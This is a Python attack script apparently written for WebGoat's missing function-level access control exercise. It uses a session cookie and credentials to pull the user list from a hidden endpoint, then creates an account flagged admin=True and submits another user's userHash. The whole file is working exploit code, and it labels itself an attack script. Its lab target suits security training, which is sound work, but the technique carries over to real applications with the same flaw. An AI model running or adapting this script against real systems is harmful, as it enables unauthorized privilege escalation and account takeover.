#!/usr/bin/env python

import sys
import json
import requests
import urllib.parse
import argparse
from requests.auth import HTTPBasicAuth

'''
    To run this script, you can use the command:

    python script.py -a http://www.webgoat.local:8080/WebGoat/access-control/ -c ${cookie} -u ${username} -p ${pasword} -P users


'''


class MissingFunctionLevelAccessControl:
    def __init__(self, attack_url, webgoat_cookie, username, password):
        self.attack_url = attack_url
        self.login_session = webgoat_cookie
        self.username = username
        self.password = password
        self.headers = {
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
            "charset": "UTF-8",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }

    def get_object_from_obscurity(self, access_control_object):
        cookies = dict(JSESSIONID=self.login_session)
        print(
            "[*] Attempting to obtain {} list from access control".format(access_control_object))

        profile_url = self.attack_url + f"{access_control_object}"
        basic_auth = HTTPBasicAuth(
            username=self.username, password=self.password)
        headers = self.headers.copy()
        headers["Content-Type"] = "application/json"
        response = requests.get(
            profile_url, headers=headers, cookies=cookies, auth=basic_auth)
        if response and "error" not in response.text:
            user_response = json.loads(response.text.lower())
            print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
            print(
                "[+] SUCCESSFULLY RETRIEVED {} object list".format(access_control_object))
            print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
            print(json.dumps(user_response, indent=2))
            print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
        return response

    def post_object_from_obscurity(self, access_control_object, payload):
        cookies = dict(JSESSIONID=self.login_session)
        print("[*] Attempting to obtain users list from access control")

        profile_url = self.attack_url + f"{access_control_object}"
        headers = self.headers.copy()
        headers["Content-Type"] = "application/json"
        response = requests.post(
            profile_url, headers=self.headers, cookies=cookies, data=payload)
        if "error" not in response.text:
            user_response = json.loads(response.text.lower())
            print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
            print("[+] SUCCESSFULLY CREATED {} user admin.".format(payload))
            print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
            print(json.dumps(user_response, indent=2))
            print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")

    def post_user_hash_from_obscurity(self, access_control_object, response_user, username):
        cookies = dict(JSESSIONID=self.login_session)
        json_users = json.loads(response_user.text)

        headers = self.headers.copy()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        print("[*] Attempting to obtain {} userhash value.".format(username))

        for user in json_users:
            if user['username'] == username:
                break

        encoded_payload = "userHash=" + urllib.parse.quote(user['userHash'])
        profile_url = self.attack_url + f"{access_control_object}"
        response = requests.post(
            profile_url, headers=headers, cookies=cookies, data=encoded_payload)

        if "error" not in response.text:
            user_response = json.loads(response.text.lower())
            print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
            print(
                "[+] SUCCESSFULLY passed {} userhash value: {}.".format(username, user['userHash']))
            print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
            print(json.dumps(user_response, indent=2))
            print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")


def main(attack_url, site_cookie, username, password, path):
    session_hijack = MissingFunctionLevelAccessControl(
        attack_url, site_cookie, username, password)
    response_users = session_hijack.get_object_from_obscurity(path)

    payload = dict(username=username, password=password, admin=True)
    session_hijack.post_object_from_obscurity(path, json.dumps(payload))
    session_hijack.post_user_hash_from_obscurity(path, response_users, "Jerry")

    response_users_admin_fix = session_hijack.get_object_from_obscurity(path)
    session_hijack.post_user_hash_from_obscurity(
        path, response_users_admin_fix, "Jerry")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Web Application Attack Script.')
    parser.add_argument('-a', '--attack-url', type=str,
                        help='Attack URL', required=True)
    parser.add_argument('-c', '--site-cookie', type=str,
                        help='Site cookie', required=True)
    parser.add_argument('-u', '--username', type=str,
                        help='Username for basic auth', required=True)
    parser.add_argument('-p', '--password', type=str,
                        help='Password for basic auth', required=True)
    parser.add_argument('-P', '--path', type=str,
                        help='Path to attack', required=True)

    args = parser.parse_args()

    main(args.attack_url, args.site_cookie,
         args.username, args.password, args.path)
